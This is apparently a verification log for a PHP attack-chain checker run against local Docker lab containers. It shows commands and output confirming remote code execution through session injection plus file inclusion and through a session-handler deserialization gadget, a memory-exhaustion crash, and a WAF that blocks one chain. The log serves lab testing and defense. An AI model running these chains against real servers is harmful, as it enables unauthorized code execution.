# Verification log

Environment: macOS, Docker 29.4, Go 1.26.2 (module targets Go 1.22), 2026-10-23.
Lab images: `php:8.2.34-fpm`, `php:8.2.35-fpm`, `php:8.2.34-apache`,
`nginx:1.27-alpine`.

## Setup

```bash
docker compose -f lab/docker-compose.yml up -d
```

```
p2s-fpm-8234     Up
p2s-fpm-8235     Up
p2s-apache-8234  Up
p2s-nginx        Up
```

## Chain A — session injection + LFI

```bash
./bin/php2shell verify chain-a --target http://127.0.0.1:18080 --command id
```

```
[OK] chain A: RCE confirmed (session injection + LFI): uid=33(www-data) gid=33(www-data) groups=33(www-data)
       LFI GET /tmp/sessions/sess_p2sd0ab605f1d65ca8c82dacf5a -> 200
       command output: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

With `--stall=false` against the lab (`session.upload_progress.cleanup=Off`) the
same result is produced. Against the patched container:

```bash
./bin/php2shell verify chain-a --target http://127.0.0.1:18082 --stall=false
```

```
[OK] chain A: RCE confirmed (session injection + LFI): uid=33(www-data) ...
```

This confirms that chain A is an application-layer condition (an LFI plus the
upload-progress filename write), not something the PHP patch removes.

## Chain C — session handler mismatch

```bash
./bin/php2shell verify chain-c --target http://127.0.0.1:18080 --attempts 5
```

```
[OK] chain C: RCE confirmed (handler mismatch -> __destruct)
       polluted /app/upload.php
       uploaded gadget 5 times to /app/upload.php
       trigger GET -> 200
       command output: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

The lab gadget (`Evil::__destruct`) is intentionally trivial. A real target
needs a POP chain in application code.

## Chain D — mod_php multipart OOM

```bash
./bin/php2shell verify chain-d --target http://127.0.0.1:18081
```

```
[OK] chain D: OOM triggered in the multipart parser (crash primitive only)
       multipart body: 15840201 bytes, 30000 part headers
       response status: 200
       response: Fatal error: Allowed memory size of 33554432 bytes exhausted
                 (tried to allocate 4096 bytes) in Unknown on line 0
```

`OK` here means the OOM primitive was observed. The verifier does not attempt
heap grooming or code execution, and the summary says so.

## Chain E — FPM stale state

```bash
./bin/php2shell verify chain-e --target http://127.0.0.1:18080 --size 25165824 --attempts 8
```

```
[FAIL] chain E: producer OOM observed, stale consumer state not reproduced
       seeded 24 MiB session -> 200
```

The producer request reliably OOMs while decoding the seeded session:

```
Fatal error: Allowed memory size of 33554432 bytes exhausted
(tried to allocate 25165856 bytes) in /var/www/html/session_oom.php on line 3
Warning: Failed to decode session object. Session has been destroyed
```

The following request against `/nosession.php` (no `session_start()` in the
script) does not show the `Session object destruction failed` warning, with
`pm.max_children` set to 1 or 2. Either request shutdown resets the state in
this configuration, or the OOM has to happen at a different allocation than the
session string. The verifier stays experimental and exit code 1 is expected.

## WAF

```bash
./bin/php2shell waf serve --listen 127.0.0.1:8080 --upstream http://127.0.0.1:18080 &
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8080/index.php
# 200
./bin/php2shell verify chain-a --target http://127.0.0.1:8080 --stall=false
# [FAIL] ... inject POST -> 403
```

The WAF log records the three matched rules (`session-in-body`,
`upload-progress`, `filename-php`) and the benign request is proxied unchanged.

## Unit tests

```bash
go test ./...
```

```
ok  .../internal/guard
ok  .../internal/mp
ok  .../internal/verify
ok  .../internal/waf
ok  .../rules
```
